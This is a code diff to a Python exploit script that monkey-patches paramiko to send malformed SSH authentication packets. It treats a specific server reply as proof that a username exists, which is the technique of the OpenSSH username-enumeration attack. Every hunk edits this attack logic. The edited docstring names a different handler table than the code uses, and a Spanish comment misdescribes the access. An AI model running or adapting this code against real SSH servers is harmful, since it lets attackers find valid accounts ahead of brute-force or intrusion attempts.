@@ -40,7 +40,7 @@ class InvalidUsername(Exception):
 
 def apply_monkey_patch() -> None:
     """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
-        patches the following internal `AuthHandler` functions by updating the internal `_client_handler_table` dict
+        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
             _parse_service_accept
             _parse_userauth_failure
     """
@@ -51,10 +51,10 @@ def apply_monkey_patch() -> None:
 
     auth_handler = paramiko.auth_handler.AuthHandler
 
-    if not hasattr(auth_handler, '_client_handler_table'):
-        raise AttributeError("AuthHandler does not have attribute '_client_handler_table'")
+    # Obtener la tabla de controladores utilizando la propiedad get
+    client_handler_table = auth_handler._client_handler_table
 
-    old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+    old_msg_service_accept = client_handler_table.get(paramiko.common.MSG_SERVICE_ACCEPT)
 
     def patched_msg_service_accept(*args, **kwargs):
         """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
@@ -67,7 +67,7 @@ def apply_monkey_patch() -> None:
         """ Called during authentication when a username is not found. """
         raise InvalidUsername(*args, **kwargs)
 
-    auth_handler._client_handler_table.update({
+    client_handler_table.update({
         paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
         paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
     })
@@ -165,4 +165,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
